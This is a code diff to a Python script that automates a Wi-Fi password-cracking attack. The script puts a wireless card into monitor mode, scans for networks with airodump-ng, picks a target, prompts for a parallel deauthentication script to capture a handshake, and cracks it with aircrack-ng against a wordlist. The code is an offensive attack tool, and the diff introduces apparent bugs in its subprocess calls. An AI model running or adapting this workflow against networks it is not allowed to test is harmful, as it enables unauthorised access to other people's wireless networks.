@@ -4,9 +4,10 @@ import subprocess
 import csv
 import os
 import signal
+import pexpect
 
 # Ask for name of scan for creating directory
-directory_name = input("Enter the project name")
+directory_name = input("Enter the project name ")
 
 # Create directory for all files created during the attack
 fullPath = os.getcwd()+"/"+directory_name
@@ -22,13 +23,16 @@ else:
 wireless_card = input("Enter your wireless card: ")
 
 airmonkill = "airmon-ng check kill"
-airmongstart = "airmon-ng start "+wireless_card
+subprocess.call(airmonkill)
+airmonstart = "airmon-ng start "+wireless_card
+subprocess.call(airmonstart)
 wireless_card = wireless_card+"mon"
 
 csvpath = fullPath+"/"+directory_name
 # runs a scan with airodump-ng to get available wifi
-airodump = 'timeout 5s airodump-ng -w '+csvpath+' --output-format csv '+wireless_card
-system(airodump)
+
+cmd_airodump = pexpect.spawn('airodump-ng '+wireless_card+' --output-format csv -w '+csvpath)
+cmd_airodump.expect([pexpect.TIMEOUT, pexpect.EOF], 10)
 
 with open(csvpath+'-01.csv', 'r') as csvfile:
     wifireader = csv.reader(csvfile, delimiter=' ', quotechar='|', skipinitialspace=True)
@@ -52,8 +56,6 @@ with open(csvpath+'-01.csv', 'r') as csvfile2:
             print("SSID \'"+bssid+"\' found on channel "+channel+" with MAC-address "+mac_address)
             break
 
-
-
 print ("Airodump will start, in the meanwhile, run deauth.py in a new terminal")
 sleep(2)
 
@@ -74,3 +76,5 @@ print ("This could take a while according to the wordlist you are using, so be p
 crack = 'aircrack-ng -a 2 {0} -w {1} '.format(csvpath+"_handshake-01.cap", wordlist)
 system(crack)
 os.killpg(os.getpgid(airodump_subprocess.pid), signal.SIGTERM)
+
+system(airmonkill)
